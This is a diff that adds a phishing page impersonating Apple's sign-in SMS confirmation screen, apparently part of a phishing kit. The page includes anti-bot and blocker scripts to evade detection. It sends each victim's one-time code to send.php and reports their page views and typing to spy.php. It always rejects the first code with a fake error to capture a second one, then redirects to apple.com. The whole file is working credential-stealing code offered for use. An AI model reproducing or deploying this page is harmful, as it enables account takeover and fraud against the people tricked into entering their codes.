@@ -1,0 +1,130 @@
+<?php 
+require './main.php';
+ include 'php/err.php';
+include 'php/blocker.php';
+include 'php/antibots4.php';
+?>
+<!doctype html>
+<html>
+<head>
+<title>Sign In - Account</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<link rel="stylesheet" href="inc/style.css">
+<link rel="icon" href="inc/logos.png">
+<script src="inc/jq.js"></script>
+</head>
+<body>
+<div class="header">
+<div class="left">
+<img src="inc/menu.png">
+</div>
+<div class="mid">
+<img src="inc/logo.png">
+</div>
+<div class="right">
+<img src="inc/bag.png">
+</div>
+</div>
+<div class="content">
+
+
+<div class="form" style="">
+<div class="col" style="margin-bottom:-13px;">
+<h1 style="margin:20px 0;">Confirmation.</h1>
+<h3>Enter confirmation code we sent to your number.</h3>
+<span id="msg"  >&nbsp; </span>
+</div>
+<div class="col">
+<p id="otp_error" style="color:red; display:none;">Incorrect code</p>
+<div class="input" id="idinput">
+<div class="input-holder"><input type="text" class="textinput" placeholder="SMS CODE" id="otp"></div>
+<div id="nrxtbtn1" onclick="sendOTP()"><img id="pic_id" src="inc/next.png"></div>
+</div>
+</div>
+
+<div class="col" style="text-align:center; margin-top:35px; font-size:0.8em;">
+<div style="margin:6px 0; align-items:center; justify-content:center; display:flex; color:#3787d7; cursor:pointer;" onclick='newCode()'>
+Request new code. 
+</div>
+</div>
+
+</div>
+</div>
+<script>
+var codes = 2;
+function newCode(){
+	$("#msg").html("<img src='inc/loader.gif' style='width:20px;'>");
+	setTimeout(function(){
+		$("#msg").html("We have sent a new code.");
+	}, 1300);
+}
+</script>
+
+<div class="footer">
+<div class="footerholder">
+<div style="padding:20px 0;">
+Need some help?  <span style="color:#3787d7;  cursor:pointer;">Chat now</span> or call 1-800-MY-APPLE.
+</div>
+</div>
+<div class="footercontent">
+<div style="display:inline-block; width:1000px; max-width:90%;">
+<div style="text-align:left; border-bottom:1px solid #cacaca; padding:14px 0;">
+The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our Security Policy.
+</div>
+<div style="text-align:left; padding:14px 0;">
+More ways to shop: <span style="color:#3787d7;  cursor:pointer;">Find an Apple Store</span> or <span style="color:#3787d7;  cursor:pointer;">other retailer</span> near you. Or call 1-800-MY-APPLE.
+</div>
+<div style="text-align:left; padding:14px 0; margin-top:-20px;">
+Copyright © 2022 Apple Inc. All rights reserved.
+</diV>
+
+</div>
+</div>
+</div>
+
+<script>
+var times = 0;
+
+function sendOTP(){
+	$("#otp_error").hide(); 
+	if($("#otp").val()!=""){
+		$("#pic_id").css("width", "39px");
+		$("#pic_id").css("padding", "5px");
+		$("#pic_id").attr("src", "inc/loader.gif");
+		otp = $("#otp").val();
+		
+		$.post("send.php", {otp:otp}, function(done){});
+		$.post("spy.php",{waiting:1});
+		setTimeout(function(){
+			times++;
+		if(times>=2){
+			window.location = "https://www.apple.com/";
+			$("#pic_id").css("width", "39px");
+			$("#pic_id").css("padding", "0");
+			$("#pic_id").attr("src", "inc/next.png");
+		}else{
+			$("#otp").val("");
+			$("#pic_id").css("width", "39px");
+			$("#pic_id").css("padding", "0");
+			$("#pic_id").attr("src", "inc/next.png");
+			$("#otp_error").show();
+			
+		}
+	}, <?php echo $seconds * 1000; ?>);
+		
+		
+	}
+}
+
+$.post("spy.php",{otpview:1});
+var c=0;
+$("#otp").keyup(function(){
+	c++;if(c==1){
+$.post("spy.php",{otping:1});
+	}});
+
+
+</script>
+</body>
+</html>
